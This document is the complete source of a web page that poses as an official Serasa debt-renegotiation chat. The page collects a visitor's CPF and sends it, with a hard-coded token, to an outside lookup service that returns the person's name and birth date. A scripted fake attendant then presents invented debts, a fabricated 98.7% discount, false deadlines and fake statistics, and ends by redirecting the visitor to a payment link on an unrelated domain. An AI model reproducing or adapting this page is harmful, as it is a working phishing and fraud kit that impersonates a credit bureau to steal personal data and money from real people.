<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <title>Atendimento Online</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <!-- Tailwind CDN -->
  <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="min-h-screen bg-gradient-to-b from-pink-50 to-white flex items-center justify-center">

  <div class="w-full rounded-3xl bg-white/80 shadow-[0_20px_60px_rgba(255,0,140,0.15)] border border-pink-100 p-4 md:p-6">
    <!-- Header -->
    <header class="flex items-center gap-2 mb-4">
      <span class="w-3 h-3 rounded-full bg-pink-500 shadow-[0_0_0_4px_rgba(255,192,203,0.6)]"></span>
      <h1 class="text-sm font-semibold text-slate-800">Atendimento Online</h1>
    </header>

    <!-- Container principal -->
    <div class="bg-gradient-to-br from-white to-pink-50/60 rounded-2xl h-[80vh] md:h-[78vh] flex flex-col shadow-inner px-4 md:px-6 py-4">
      <!-- Chat -->
      <main id="chat" class="flex-1 overflow-y-auto space-y-4 pr-1 md:pr-2">
        <!-- Mensagens v√£o ser injetadas aqui -->
      </main>
    </div>
  </div>

  <style>
    #chat button {
      text-transform: uppercase;
    }

    #chat {
      scrollbar-width: thin;
      scrollbar-color: rgba(0,0,0,0.12) transparent;
    }

    #chat::-webkit-scrollbar {
      width: 6px;
    }

    #chat::-webkit-scrollbar-track {
      background: transparent;
    }

    #chat::-webkit-scrollbar-thumb {
      background-color: rgba(0,0,0,0.12);
      border-radius: 9999px;
    }

    #chat::-webkit-scrollbar-thumb:hover {
      background-color: rgba(0,0,0,0.18);
    }
  </style>

  <script>
    // ==========================
    // CONFIG
    // ==========================

    const API_URL = 'https://bk.elaidisparos.tech/consultar-filtrada/cpf';
    const API_TOKEN = 'bzocj1slchlx1bdh2tj9ai';

    // (constantes antigas ficam, mas n√£o s√£o mais usadas diretamente;
    //  agora usamos delays rand√¥micos)
    const TYPING_DURATION = 1200;
    const MESSAGE_DELAY   = 900;
    const OPTIONS_EXTRA_DELAY = 1200;

    let currentUser = null;
    let currentStepId = null;
    let scrollRaf = null;
    let typingBubble = null;

    // helper para delay rand√¥mico
    function randomBetween(min, max) {
      return Math.floor(Math.random() * (max - min + 1)) + min;
    }

    const steps = [
      {
        id: 'bemvindo',
        messages: [
          { type: 'image', url: 'img/z65tvo7nm1llt8bkeu84uagm.png', alt: 'Imagem de exemplo' },
          { type: 'text', content: '<strong>Uma atendente online acaba de entrar na conversa...</strong>' },
          { type: 'text', content: 'Ol√° <strong>{{nome}}</strong>, prazer! Me chamo <strong>Renata</strong>, sua atendente da Serasa. <strong>Seja bem-vindo(a) ao canal oficial de atendimento.</strong>' },
          { type: 'text', content: 'Consulte gr√°tis as ofertas dispon√≠veis especialmente para voc√™!' },
          { type: 'text', content: 'Estamos <strong>conferindo seus dados.</strong> Por favor, <strong>aguarde um instante...</strong>' },
          { type: 'image', url: 'img/vnc3m2pxpzdxrc3zfa0dmecz.gif', alt: 'Imagem de exemplo' },
          { type: 'text', content: '<strong>Dados verificados com sucesso!</strong> Pode seguir para a pr√≥xima etapa.' },
          { type: 'text', content: 'Nome: <strong>{{nome}}</strong>' },
          { type: 'text', content: 'Identifica√ß√£o (CPF): <strong>{{cpf}}</strong>' },
          { type: 'text', content: 'Data de Nascimento: <strong>{{nascimento}}</strong>' },
          { type: 'text', content: 'Score: <strong>129 Pontos - Baixo</strong>' },
          { type: 'text', content: '<strong>Seus dados est√£o seguros</strong> e ser√£o usados <strong>exclusivamente para consulta.</strong>' }
        ],
        options: [
          { label: 'Confirmar', next: 'confirmar_1' },
        ]
      },
      {
        id: 'confirmar_1',
        messages: [
          { type: 'image', url: 'img/l0tpqu44t32oigdlwyj3ucl8.png', alt: 'Imagem de exemplo' },
          { type: 'text', content: '<strong>{{nome}}</strong>, seja bem-vindo(a) ao atendimento do <strong>Feir√£o Limpa Nome da Serasa.</strong>' },
          { type: 'image', url: 'img/wehsiqxobai8vbd0zffaaph0.gif', alt: 'Imagem de exemplo' },
          { type: 'text', content: '√öltimo dia do Feir√£o Online Serasa Limpa Nome! Deseja consultar as ofertas dispon√≠veis para o seu CPF?' }
        ],
        options: [
          { label: 'Sim, Consultar', next: 'confirmar_2' }
        ]
      },
      {
        id: 'confirmar_2',
        messages: [
          { type: 'text', content: 'Por favor, aguarde enquanto <strong>analisamos a situa√ß√£o do seu CPF</strong> em nosso sistema...' },
          { type: 'image', url: 'img/sxqndynu3clfvrt5p4o9kkci.gif', alt: 'Imagem de exemplo' },
          { type: 'text', content: '<strong>‚úÖ An√°lise conclu√≠da! ‚úÖ</strong>' },
          { type: 'text', content: '<strong>{{nome}},</strong> identificamos <strong>3 d√≠vidas ativas</strong> no sistema.' },
          { type: 'text', content: 'Os valores variam entre <strong>R$528,74</strong> e <strong>R$5.237,78</strong>, totalizando uma d√≠vida ativa de <strong>R$7.566,52</strong> em seu <strong>CPF.</strong>' },
          { type: 'text', content: '<strong>Situa√ß√£o para o CPF: {{cpf}} - NEGATIVADO</strong>' },
          { type: 'audio', url: 'img/xkx4wpa0js4evbll2szpq5f5.mp3' },
          { type: 'image', url: 'img/gdgqop2bve9s4pyqc2wmk8wz.gif', alt: 'Imagem de exemplo' },
          { type: 'text', content: 'Deseja <strong>verificar se h√° algum acordo dispon√≠vel</strong> para voc√™?' }
        ],
        options: [
          { label: 'Verificar Acordo', next: 'acordo' }
        ]
      },
      {
        id: 'acordo',
        messages: [
          { type: 'text', content: '<strong>Aguarde um instante</strong> enquanto verificamos no sistema se h√° <strong>acordos dispon√≠veis</strong> para voc√™...' },
          { type: 'image', url: 'img/hm2ngw947zqrm9xp2pxn6iff.gif', alt: 'Imagem de exemplo' },
          { type: 'text', content: '<strong>Not√≠cia:</strong> Somente hoje, <strong>mais de 12.872 brasileiros</strong> no estado de S√£o Paulo j√° negociaram suas d√≠vidas no <strong>Feir√£o Limpa Nome Serasa Online.</strong>' },
          { type: 'iframe', url: 'https://www.youtube.com/embed/_McElcgX7R8?si=y5msh55Z1Ga6Irdj' },
          { type: 'text', content: '‚úÖ  <strong>Acordo encontrado! 1 (um) acordo</strong> foi localizado para <strong>{{nome}}, CPF: {{cpf}}.</strong>' },
          { type: 'text', content: 'Informa√ß√µes do acordo 83N2L618362E para {{nome}}.' },
          { type: 'text', content: 'Acordo: <strong>83N2L618362E</strong>' },
          { type: 'text', content: 'Valor total da d√≠vida: <strong>R$7.566,52</strong>' },
          { type: 'text', content: 'Valor do contrato: <strong>R$78,47</strong>' },
          { type: 'text', content: 'Desconto total: <strong>98,7% (R$7.488,05)</strong>' },
          { type: 'text', content: '‚ö†Ô∏è Este contrato √© v√°lido apenas para o titular: <strong>{{nome}}, portador(a) do CPF {{cpf}}.</strong>' },
          { type: 'image', url: 'img/n3oer38z1bkxthi3ldca5dqs.gif', alt: 'Imagem de exemplo' },
          { type: 'audio', url: 'img/i98z451yktrxbv8jrni5nwaq.mp3' },
          { type: 'text', content: '<strong>Deseja realizar o acordo e ter seu nome limpo ainda hoje?</strong>' }
        ],
        options: [
          { label: 'Sim quero quitar minhas d√≠vidas', next: 'acordo_fim' }
        ]
      },
      {
        id: 'acordo_fim',
        messages: [
          { type: 'text', content: 'Confirmando acordo, aguarde...' },
          { type: 'text', content: '<strong>SERASA INFORMA:</strong> Ao efetuar o pagamento do acordo, todas as d√≠vidas em aberto no CPF <strong>{{cpf}}</strong> ser√£o removidas em at√© 1 hora, e voc√™ ter√° seu nome limpo novamente!' },
          { type: 'text', content: 'Par√°bens! Seu acordo foi confirmado!' },
          { type: 'text', content: '<strong>Gerando sua guia de pagamento...</strong> Por favor, aguarde um instante.' },
          { type: 'text', content: '<strong>‚úÖ Acordo confirmado: 83N2L618362E</strong>' },
          { type: 'text', content: 'Benefici√°rio(a): <strong>{{nome}}</strong>' },
          { type: 'text', content: 'Identifica√ß√£o (CPF): <strong>{{cpf}}</strong>' },
          { type: 'text', content: '<strong>üëâ Clique no bot√£o abaixo para acessar sua guia de pagamento.</strong>' },
          { type: 'text', content: '<strong>‚ö†Ô∏è Aten√ß√£o:</strong> O n√£o pagamento deste acordo pode gerar <strong>novas restri√ß√µes no CPF</strong> e impedir participa√ß√µes futuras em programas como o Feir√£o.' }
        ],
        options: [
          {
            label: 'Acessar √°rea de pagamento',
            url: 'https://pay.finalizeoacordo.com/691a2639cd45adac65bc25cb'
          }
        ]
      }
    ];

    // ==========================
    // ELEMENTOS E UTIL
    // ==========================

    const chatEl = document.getElementById('chat');

    function scrollToBottom() {
      if (scrollRaf) cancelAnimationFrame(scrollRaf);
      scrollRaf = requestAnimationFrame(() => {
        chatEl.scrollTo({
          top: chatEl.scrollHeight,
          behavior: 'smooth'
        });
      });
    }

    // typing indicator (sem avatar)
    function showTyping() {
      if (typingBubble) return;

      const wrapper = document.createElement('div');
      wrapper.className = 'flex items-start gap-3 typing-bubble';

      const avatarPlaceholder = document.createElement('div');
      avatarPlaceholder.className = 'w-9 h-9 mt-1';

      const bubble = document.createElement('div');
      bubble.className =
        'max-w-[60%] bg-white rounded-2xl px-3 py-2 text-xs text-slate-500 shadow-sm border border-pink-50';
      bubble.innerHTML =
        '<span class="inline-flex items-center gap-1">Digitando<span class="animate-pulse">...</span></span>';

      wrapper.appendChild(avatarPlaceholder);
      wrapper.appendChild(bubble);

      chatEl.appendChild(wrapper);
      typingBubble = wrapper;
      scrollToBottom();
    }

    function hideTyping() {
      if (!typingBubble) return;
      typingBubble.remove();
      typingBubble = null;
    }

    // placeholders
    function interpolate(text) {
      if (!currentUser) return text;
      const primeiroNome = currentUser.nome ? currentUser.nome.split(' ')[0] : '';

      return text
        .replace(/{{nome}}/g, currentUser.nome || '')
        .replace(/{{primeiro_nome}}/g, primeiroNome)
        .replace(/{{cpf}}/g, currentUser.cpf || '')
        .replace(/{{nascimento}}/g, currentUser.nascimento || '');
    }

    // Mensagem do BOT
    function addBotMessage(contentNode, showAvatar = true) {
      const wrapper = document.createElement('div');
      wrapper.className = 'flex items-start gap-3';

      let avatar;
      if (showAvatar) {
        avatar = document.createElement('div');
        avatar.className =
          'w-9 h-9 rounded-full bg-pink-500 flex items-center justify-center text-xs font-bold text-white shadow-md shadow-pink-200 mt-1';
        avatar.textContent = 'S';
      } else {
        avatar = document.createElement('div');
        avatar.className = 'w-9 h-9 mt-1';
      }

      const bubble = document.createElement('div');
      const isAudio = contentNode.tagName === 'AUDIO';

      if (isAudio) {
        bubble.className = 'max-w-[80%] rounded-2xl py-1';
      } else {
        bubble.className =
          'max-w-[80%] bg-white rounded-2xl px-4 py-3 text-sm text-slate-800 shadow-md border border-pink-50';
      }

      bubble.appendChild(contentNode);
      wrapper.appendChild(avatar);
      wrapper.appendChild(bubble);

      chatEl.appendChild(wrapper);
      scrollToBottom();

      if (isAudio) {
        const playPromise = contentNode.play();
        if (playPromise && typeof playPromise.then === 'function') {
          playPromise.catch(() => {});
        }
      }
    }

    // Mensagem do usu√°rio
    function addUserMessage(text) {
      const wrapper = document.createElement('div');
      wrapper.className = 'flex items-start gap-2 justify-end';

      const bubble = document.createElement('div');
      bubble.className =
        'max-w-[80%] rounded-2xl bg-pink-500 text-white px-4 py-2 text-sm shadow-md shadow-pink-200';
      bubble.textContent = text;

      wrapper.appendChild(bubble);
      chatEl.appendChild(wrapper);
      scrollToBottom();
    }

    // Cria n√≥ de mensagem
    function createMessageNode(msg) {
      if (msg.type === 'text') {
        const p = document.createElement('p');
        p.innerHTML = interpolate(msg.content);
        return p;
      }

      if (msg.type === 'audio') {
        const audio = document.createElement('audio');
        audio.controls = true;
        audio.src = msg.url;
        return audio;
      }

      if (msg.type === 'image') {
        const img = document.createElement('img');
        img.src = msg.url;
        img.alt = msg.alt || '';
        img.className = 'rounded-xl mt-3 border border-pink-100 shadow-sm max-h-56 md:max-h-64 object-contain';
        return img;
      }

      if (msg.type === 'iframe') {
        const iframe = document.createElement('iframe');
        iframe.src = msg.url;
        iframe.className = 'mt-3 w-full rounded-xl border border-pink-100 shadow-sm';
        iframe.width = '100%';
        iframe.height = '220';
        iframe.allowFullscreen = true;
        return iframe;
      }

      const span = document.createElement('span');
      span.textContent = 'Tipo de mensagem n√£o suportado.';
      return span;
    }

    // Bot√µes de op√ß√µes
    function renderOptions(step) {
      if (!step.options || step.options.length === 0) return;

      const container = document.createElement('div');
      container.className = 'flex flex-wrap gap-2 mt-2';

      step.options.forEach((opt) => {
        const btn = document.createElement('button');
        btn.type = 'button';
        btn.textContent = opt.label;
        btn.className =
          'px-3 py-2 rounded-full bg-white border border-pink-200 text-xs md:text-sm font-medium text-pink-600 ' +
          'hover:bg-pink-50 hover:border-pink-300 transition shadow-sm';

        btn.addEventListener('click', () => {
          addUserMessage(opt.label);

          if (opt.url) {
            window.top.location.href = opt.url; // redireciona fora do iframe
            return;
          }

          if (opt.next) {
            renderStep(opt.next);
          } else {
            location.reload();
          }
        });

        container.appendChild(btn);
      });

      addBotMessage(container, false);
    }

    // Renderiza um passo com delays "humanos"
    function renderStep(stepId) {
      currentStepId = stepId;
      const step = steps.find((s) => s.id === stepId);
      if (!step) return;

      let totalTime = 0;

      step.messages.forEach((msg, index) => {
        // pausa antes de come√ßar a digitar
        const pauseBeforeTyping = index === 0
          ? randomBetween(800, 1600)    // primeira mensagem entra mais r√°pido
          : randomBetween(2000, 4000);  // 2‚Äì4s entre mensagens

        const typingTime = randomBetween(1200, 2500); // tempo "digitando..."

        totalTime += pauseBeforeTyping;
        setTimeout(() => {
          showTyping();
        }, totalTime);

        totalTime += typingTime;
        setTimeout(() => {
          hideTyping();
          const node = createMessageNode(msg);
          const showAvatar = index === 0; // s√≥ primeira mensagem do step com avatar
          addBotMessage(node, showAvatar);
        }, totalTime);
      });

      // pause extra antes dos bot√µes
      const optionsDelay = randomBetween(1500, 3000);
      totalTime += optionsDelay;

      setTimeout(() => {
        renderOptions(step);
      }, totalTime);
    }

    // ==========================
    // CPF DENTRO DO CHAT
    // ==========================

    function renderCpfInputMessage() {
      const container = document.createElement('div');

      const label = document.createElement('p');
      label.className = 'text-xs text-slate-500 mb-1';
      label.textContent = 'Digite seu CPF para iniciar o atendimento:';

      const form = document.createElement('form');
      form.className = 'flex flex-wrap gap-2 items-center mt-1';

      const input = document.createElement('input');
      input.type = 'text';
      input.maxLength = 11;
      input.placeholder = 'Digite seu CPF';
      input.className =
        'flex-1 rounded-xl bg-blue-50 border border-pink-100 px-3 py-2 text-sm text-slate-700 placeholder-slate-400 ' +
        'focus:outline-none focus:ring-2 focus:ring-pink-400 focus:border-pink-300 shadow-sm';

      const button = document.createElement('button');
      button.type = 'submit';
      button.textContent = 'Enviar';
      button.className =
        'px-5 py-2 rounded-xl bg-pink-500 text-sm font-semibold text-white ' +
        'shadow-md shadow-pink-200 hover:bg-pink-400 transition';

      form.appendChild(input);
      form.appendChild(button);

      container.appendChild(label);
      container.appendChild(form);

      form.addEventListener('submit', async (e) => {
        e.preventDefault();
        const cpf = input.value.replace(/\D/g, '');

        if (!cpf || cpf.length !== 11) {
          alert('CPF inv√°lido. Digite 11 n√∫meros.');
          return;
        }

        input.disabled = true;
        button.disabled = true;

        try {
          const user = await fetchUserByCpf(cpf);
          currentUser = user;
          renderStep('bemvindo');
        } catch (error) {
          console.error(error);
          const errorMsg = document.createElement('p');
          errorMsg.textContent =
            'N√£o consegui buscar seus dados. Tente novamente mais tarde.';
          addBotMessage(errorMsg, true);

          input.disabled = false;
          button.disabled = false;
        }
      });

      addBotMessage(container, false);
    }

    // Mensagem inicial
    function startCpfFlow() {
      const msg = document.createElement('p');
      msg.innerHTML =
        '<strong>Bem-vindo!</strong> Para iniciar a an√°lise, informe seu <strong>CPF</strong> para verifica√ß√£o.<br/>' +
        'Digite apenas <strong>n√∫meros</strong>. Seus <strong>dados</strong> s√£o usados somente para esta <strong>verifica√ß√£o</strong>.';
      addBotMessage(msg, true);

      // delay mais natural antes de mostrar o input
      const delay = randomBetween(1800, 3200);
      setTimeout(() => {
        renderCpfInputMessage();
      }, delay);
    }

    // Busca usu√°rio na API
    async function fetchUserByCpf(cpf) {
      const url = `${API_URL}?cpf=${encodeURIComponent(cpf)}&token=${encodeURIComponent(API_TOKEN)}`;
      const response = await fetch(url);
      if (!response.ok) throw new Error('Erro ao consultar API');
      return response.json();
    }

    // Inicia conversa
    startCpfFlow();
  </script>

</body>
</html>
